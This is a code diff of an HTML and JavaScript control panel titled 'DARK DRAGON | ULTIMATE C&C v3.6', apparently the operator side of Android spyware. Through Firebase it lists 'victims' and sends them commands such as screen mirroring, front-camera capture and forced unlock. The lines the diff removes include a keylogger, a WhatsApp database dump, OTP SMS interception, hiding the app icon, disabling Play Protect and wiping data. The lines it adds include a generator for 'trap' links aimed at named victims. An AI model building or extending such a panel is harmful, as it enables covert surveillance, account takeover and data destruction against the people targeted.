@@ -2,7 +2,7 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | ULTIMATE C&C v3.5</title>
+    <title>DARK DRAGON | ULTIMATE C&C v3.6</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -25,10 +25,8 @@
         .data-card { border: 1px solid var(--dark-red); background: #000; padding: 15px; margin-bottom: 15px; border-radius: 5px; }
         table { width: 100%; border-collapse: collapse; font-size: 11px; }
         th, td { border: 1px solid var(--dark-red); padding: 10px; text-align: left; }
-        .live-window { width: 100%; height: 350px; background: #000; border: 2px dashed var(--neon-red); display: flex; align-items: center; justify-content: center; color: var(--cyan); }
         .btn-select { background: var(--green); color: black; }
         .btn-deselect { background: var(--blue); color: white; }
-        .btn-remove { background: #550000; color: white; }
         .stat-box { display: inline-block; padding: 10px; border: 1px solid var(--cyan); margin-right: 10px; border-radius: 5px; min-width: 120px; text-align: center; }
     </style>
 </head>
@@ -47,11 +45,12 @@
     <header><h3>DRAGON REMOTE COMMAND INTERFACE</h3></header>
     <div class="target-status">
         <span>LOCKED TARGET: <b id="active-target-display" style="color:var(--cyan)">NONE</b></span>
-        <button id="deselect-btn" class="btn-deselect" style="display:none;" onclick="deselectTarget()">DESELECT DEVICE</button>
+        <button id="deselect-btn" class="btn-deselect" style="display:none;" onclick="deselectTarget()">DESELECT</button>
     </div>
 
     <div class="tabs">
         <div class="tab active" onclick="showTab(event, 'radar')">🛰️ RADAR</div>
+        <div class="tab" onclick="showTab(event, 'cat-trap')">🐈 TRAP</div>
         <div class="tab" onclick="showTab(event, 'victims')">👥 VICTIMS</div>
         <div class="tab" onclick="showTab(event, 'insights')">📊 24H LOGS</div>
         <div class="tab" onclick="showTab(event, 'screen')">📺 SCREEN</div>
@@ -65,8 +64,19 @@
             <h2>SYSTEM OVERVIEW</h2>
             <div class="stat-box" style="border-color: var(--green)">ONLINE: <span id="online-count">0</span></div>
             <div class="stat-box" style="border-color: var(--neon-red)">TOTAL: <span id="total-count">0</span></div>
-            <div class="stat-box" style="border-color: var(--gold)">HACKS: <span id="hack-count">0</span></div>
-            <p style="margin-top:20px;">Scanning for active nodes in the network...</p>
+            <p style="margin-top:20px;">Monitoring network nodes...</p>
+        </div>
+
+        <div id="cat-trap" class="panel">
+            <h2>GENERATE SILENT TRAP</h2>
+            <p style="font-size: 11px; color: var(--gold);">Enter a name for your victim to generate a tracking link.</p>
+            <input type="text" id="target-id-input" placeholder="Victim Name (e.g. John)">
+            <br>
+            <button onclick="generateCatLink()">GENERATE TRAP LINK</button>
+            <div class="data-card" style="margin-top: 20px; border-color: var(--cyan);">
+                <p>Generated Link:</p>
+                <code id="link-result" style="color:var(--cyan); word-break: break-all;">No link generated.</code>
+            </div>
         </div>
 
         <div id="victims" class="panel">
@@ -80,45 +90,16 @@
         </div>
 
         <div id="insights" class="panel">
-            <h2>LIVE TRAFFIC & SYSTEM LOGS (24H)</h2>
+            <h2>SYSTEM ACTIVITY LOGS</h2>
             <div class="data-card" id="log-container" style="max-height: 400px; overflow-y: auto; font-size: 10px; color: var(--green);">
-                [00:00:00] System initialized...<br>
-                [08:43:20] Waiting for incoming traffic...
+                [SYSTEM] Ready for deployment...
             </div>
         </div>
 
-        <div id="screen" class="panel">
-            <h2>LIVE VIEW</h2>
-            <div class="live-window" id="screen-viewer">[ NO ACTIVE STREAM ]</div>
-            <br>
-            <button onclick="sendCommand('start_screen')">MIRROR SCREEN</button>
-            <button onclick="sendCommand('keylog_start')">START KEYLOGGER</button>
-            <button onclick="sendCommand('dump_clipboard')" style="background:var(--gold)">GET CLIPBOARD</button>
-        </div>
-
-        <div id="unlocked" class="panel">
-            <h2>🔓 ADVANCED EXPLOITS</h2>
-            <div class="data-card">
-                <h3>BYPASS & ACCESS</h3>
-                <button class="btn-unlock" onclick="sendCommand('force_unlock')">FORCE UNLOCK</button>
-                <button onclick="sendCommand('get_whatsapp_db')">DUMP WHATSAPP</button>
-                <button onclick="sendCommand('get_otp_sms')" style="background:var(--cyan)">INTERCEPT OTP</button>
-            </div>
-            <div class="data-card">
-                <h3>STEALTH MODE</h3>
-                <button onclick="sendCommand('hide_app_icon')">HIDE ICON</button>
-                <button onclick="sendCommand('disable_play_protect')">KILL PROTECT</button>
-            </div>
-        </div>
-
-        <div id="control" class="panel">
-            <h2>REMOTE ACTIONS</h2>
-            <button onclick="sendCommand('vibrate')">VIBRATE</button>
-            <button onclick="sendCommand('play_alarm')">SOUND ALARM</button>
-            <button onclick="sendCommand('torch_on')">TORCH ON</button>
-            <button onclick="sendCommand('lock_device')" style="background:var(--dark-red); color:white;">LOCK SCREEN</button>
-            <button onclick="sendCommand('factory_reset')" style="background:red; color:white;">WIPE DATA</button>
-        </div>
+        <div id="screen" class="panel"><h2>SCREEN MIRROR</h2><button onclick="sendCommand('start_screen')">START MIRROR</button></div>
+        <div id="camera" class="panel"><h2>REMOTE CAMERA</h2><button onclick="sendCommand('cam_front')">FRONT CAM</button></div>
+        <div id="unlocked" class="panel"><h2>EXPLOITS</h2><button onclick="sendCommand('force_unlock')">FORCE UNLOCK</button></div>
+        <div id="control" class="panel"><h2>CONTROL</h2><button onclick="sendCommand('vibrate')">VIBRATE</button></div>
     </div>
 </div>
 
@@ -135,102 +116,89 @@
             document.getElementById('login-box').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
             loadVictims();
-            updateStats();
         } else { alert("ACCESS DENIED"); }
+    }
+
+    // --- Cat Trap Generator Function ---
+    function generateCatLink() {
+        const target = document.getElementById('target-id-input').value;
+        if(!target) return alert("Victim නමක් දාපන් මචං!");
+        const baseURL = window.location.href.substring(0, window.location.href.lastIndexOf("/") + 1);
+        const finalLink = baseURL + "cat_trap.html?t=" + btoa(target);
+        document.getElementById('link-result').innerText = finalLink;
+        logActivity(`Trap Generated for: ${target}`);
     }
 
     function loadVictims() {
         db.ref('victims').on('value', (snap) => {
             const list = document.getElementById('victim-list');
-            const totalCount = document.getElementById('total-count');
             list.innerHTML = "";
             let count = 0;
             snap.forEach((child) => {
-                const val = child.val();
                 count++;
+                const val = child.val();
                 list.innerHTML += `<tr>
-                    <td>${val.target}</td>
-                    <td>${val.device}</td>
-                    <td>${val.time}</td>
+                    <td>${val.target}</td><td>${val.device}</td><td>${val.time}</td>
                     <td><button class="btn-select" onclick="selectTarget('${child.key}', '${val.target}')">SELECT</button></td>
-                    <td><button class="btn-remove" onclick="removeVictim('${child.key}')">PURGE</button></td>
+                    <td><button style="background:#550000;color:white;" onclick="removeVictim('${child.key}')">PURGE</button></td>
                 </tr>`;
-                logActivity(`Node Detected: ${val.target} (${val.device})`);
             });
-            totalCount.innerText = count;
+            document.getElementById('total-count').innerText = count;
         });
     }
 
     window.activeTarget = null;
-
     function selectTarget(key, name) {
         window.activeTarget = key;
         document.getElementById('active-target-display').innerText = name;
         document.getElementById('deselect-btn').style.display = "inline-block";
         logActivity(`Target Locked: ${name}`);
-        alert("Target [" + name + "] Selected!");
     }
 
-    // --- උඹ ඉල්ලපු Deselect Function එක ---
     function deselectTarget() {
-        if(window.activeTarget) {
-            logActivity(`Deselected Target: ${document.getElementById('active-target-display').innerText}`);
-            window.activeTarget = null;
-            document.getElementById('active-target-display').innerText = "NONE";
-            document.getElementById('deselect-btn').style.display = "none";
-            alert("Device Deselected. Standing by...");
-        }
+        window.activeTarget = null;
+        document.getElementById('active-target-display').innerText = "NONE";
+        document.getElementById('deselect-btn').style.display = "none";
+        logActivity(`Device Deselected.`);
     }
 
     function removeVictim(key) {
-        if(confirm("Confirm Purge?")) {
-            db.ref('victims/' + key).remove();
-            if(window.activeTarget === key) deselectTarget();
-        }
+        if(confirm("Confirm Purge?")) db.ref('victims/' + key).remove();
+    }
+
+    function sendCommand(cmd) {
+        if(!window.activeTarget) return alert("SELECT A DEVICE!");
+        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
+        logActivity(`Command Sent: ${cmd}`);
     }
 
     function logActivity(msg) {
         const log = document.getElementById('log-container');
-        const time = new Date().toLocaleTimeString();
-        log.innerHTML = `[${time}] ${msg}<br>` + log.innerHTML;
-    }
-
-    function sendCommand(cmd) {
-        if(!window.activeTarget) return alert("SELECT A DEVICE FIRST!");
-        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
-        logActivity(`Command Sent to Target: ${cmd}`);
+        log.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}<br>` + log.innerHTML;
     }
 
     function showTab(evt, id) {
         document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        if(evt) evt.currentTarget.classList.add('active');
+        evt.currentTarget.classList.add('active');
     }
 
-    function updateStats() {
-        // මේකෙන් Stats පෙන්නනවා (Example logic)
-        document.getElementById('online-count').innerText = Math.floor(Math.random() * 5) + 1;
-        document.getElementById('hack-count').innerText = "Active";
-    }
-
-    // Matrix Effect
+    // Matrix Rain
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const alphabet = "01";
     const rainDrops = Array(Math.floor(canvas.width / 16)).fill(1);
-    function drawMatrix() {
+    function draw() {
         ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
         ctx.fillStyle = '#ff0000'; ctx.font = '16px monospace';
-        for(let i = 0; i < rainDrops.length; i++) {
-            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-            ctx.fillText(text, i * 16, rainDrops[i] * 16);
-            if(rainDrops[i] * 16 > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
+        rainDrops.forEach((y, i) => {
+            ctx.fillText(Math.floor(Math.random()*2), i * 16, y * 16);
+            if(y * 16 > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
             rainDrops[i]++;
-        }
+        });
     }
-    setInterval(drawMatrix, 50);
+    setInterval(draw, 50);
 </script>
 </body>
 </html>
